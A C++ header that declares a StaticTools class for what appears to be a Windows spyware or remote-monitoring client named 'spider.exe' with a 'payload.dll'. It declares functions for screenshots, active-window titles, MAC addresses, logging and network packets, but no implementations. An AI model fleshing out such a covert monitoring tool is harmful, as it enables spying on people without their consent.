#pragma once

#include <string>
#include <sstream>
#include <fstream>

#include <boost/filesystem.hpp>
#include <boost/date_time/posix_time/posix_time.hpp>

#include <Windows.h>
#include <IPHlpApi.h>
#include <ShlObj.h>

#pragma comment(lib, "IPHLPAPI.lib")

#include "Protocol.h"

#define DLL_NAME "payload.dll"
#define APP_NAME "spider.exe"

class StaticTools
{
public:
	static std::string GetMacAddress();
	static std::streamoff GetFileSize(std::string const& filename);
	static std::string GetActiveWindowTitle(void);
	static std::string GetDate(void);
	static std::string GetFolderPath(WORD id);
	static std::string GetProjectResourceDirectory(void);
	static void CreateFolder(std::string const& path);
	static std::string GetDLLPath();
	static std::string GetDLLPath(std::string const& appPath);
	static HBITMAP MakeScreenshot(void);
	static Packet *CreatePacket(PacketType type, std::string const& data);
	static Packet *CreateUDPPacket(PacketType type, std::string const& data);

	static std::string Mac;
	static std::ofstream Log;
};

